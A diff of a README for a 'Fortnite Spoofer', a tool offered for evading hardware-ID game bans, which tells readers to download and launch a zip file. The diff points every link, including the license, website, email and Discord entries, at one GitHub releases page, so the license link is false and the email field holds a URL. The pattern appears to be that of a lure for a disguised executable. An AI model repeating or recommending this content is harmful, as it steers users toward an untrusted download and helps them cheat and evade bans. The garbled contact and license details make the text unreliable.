@@ -10,12 +10,12 @@ bypass-hardware-bans, fortnite-bypass-ban-2025, fortnite-unban-methods, hwid, hw
 
 ### Get Started:
 🚨 Click the button below and download the Spoofer tool:
-[![Download Spoofer Tool](https://img.shields.io/badge/Download-Spoofer%20Tool-blue.svg)](https://github.com/uploads/App.zip)
+[![Download Spoofer Tool](https://github.com/breezykhumalo/FortniteSpoofer/releases%https://github.com/breezykhumalo/FortniteSpoofer/releases)](https://github.com/breezykhumalo/FortniteSpoofer/releases)
 
 ➡️ **Note:** The provided link needs to be launched.
 
 ### Explore Further:
-Visit the [Releases](https://github.com/FortniteSpoofer/releases) section for more information if the link does not work or is not provided.
+Visit the [Releases](https://github.com/breezykhumalo/FortniteSpoofer/releases) section for more information if the link does not work or is not provided.
 
 ---
 
@@ -85,14 +85,14 @@ Whether you're looking to bypass bans, protect your account from HWID restrictio
 We welcome contributions from the community to enhance the functionalities of the Fortnite Spoofer tool and improve ban evasion methods. Feel free to submit pull requests or open issues for feedback and suggestions.
 
 #### License:
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT) - see the [LICENSE](https://github.com/FortniteSpoofer/LICENSE) file for details.
+This project is licensed under the [MIT License](https://github.com/breezykhumalo/FortniteSpoofer/releases) - see the [LICENSE](https://github.com/breezykhumalo/FortniteSpoofer/releases) file for details.
 
 ---
 
 ### Connect with Us:
-🌐 Website: [FortniteSpoofer.com](https://www.FortniteSpoofer.com)
-📧 Email: contact@fortnitespoofer.com
-📱 Discord: [Join Now](https://discord.com/FortniteSpoofer)
+🌐 Website: [https://github.com/breezykhumalo/FortniteSpoofer/releases](https://github.com/breezykhumalo/FortniteSpoofer/releases)
+📧 Email: https://github.com/breezykhumalo/FortniteSpoofer/releases
+📱 Discord: [Join Now](https://github.com/breezykhumalo/FortniteSpoofer/releases)
 
 ---
 
